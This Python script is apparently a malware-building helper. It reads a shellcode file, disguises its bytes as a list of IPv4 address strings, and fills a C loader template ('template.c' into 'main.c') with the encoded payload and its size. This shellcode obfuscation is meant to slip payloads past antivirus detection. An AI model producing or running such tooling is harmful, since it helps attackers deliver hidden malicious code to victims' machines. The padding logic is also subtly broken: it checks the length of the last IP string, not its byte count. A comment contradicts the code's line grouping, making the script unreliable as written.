import os
import sys
import random

def file_to_bytearray(filename):
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return bytearray(file_content)
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise

def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def fill_template(obfuscated_data, original_data_size, num_ips):
    try:
        # Read the content of the input file
        with open("template.c", 'r') as file:
            content = file.read()

        # Replace the strings
        modified_content = content.replace("{{SHELLCODE}}", obfuscated_data).replace("{{SHELLCODE_SIZE}}", original_data_size).replace("{{NUM_IPS}}", str(num_ips))

        # Write the modified content to the output file
        with open("main.c", 'w') as file:
            file.write(modified_content)

        print("[i] Template filled successfully.")
    
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))

def shellcode_to_ipv4(data):
    ip_addresses = []

    # Split the data into chunks of 4 bytes
    for i in range(0, len(data), 4):
        ip = '.'.join(str(byte) for byte in data[i:i+4])
        ip_addresses.append(ip)

    # Check if the last chunk is not 4 bytes long
    if len(ip_addresses[-1]) < 4:
        missing_b = 4 - len(ip_addresses[-1])
        ip_addresses[-1] += '.' + '.'.join(str(random.randint(0, 255)) for _ in range(missing_b))

    return ip_addresses

def create_ips_string(ips):
    ips_str = ""
    # Create the string with the IP addresses, for every 4 ips add a new line and a tab
    for i, ip in enumerate(ips):
        ips_str += f"\"{ip}\", "
        if (i+1) % 3 == 0:
            # If its the last IP address, don't add a new line
            if i != len(ips) - 1:
                ips_str += "\n\t"
            
    # Remove the last comma
    ips_str = ips_str[:-2]

    return ips_str

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[i] Usage: python script.py <file_path>")
        sys.exit(1)
    
    filename = sys.argv[1]
    if os.path.isfile(filename):
        original_data = file_to_bytearray(filename)

        # Number of bytes in the original data
        original_data_size = len(original_data)

        # Convert the original data to IPv4 format
        obfuscated_data = shellcode_to_ipv4(original_data)

        # Create the string with the IP addresses
        ips_str = create_ips_string(obfuscated_data)

        # Fill template
        fill_template(ips_str, str(original_data_size), len(obfuscated_data))

    else:
        print("[!] File not found or invalid path:", filename)
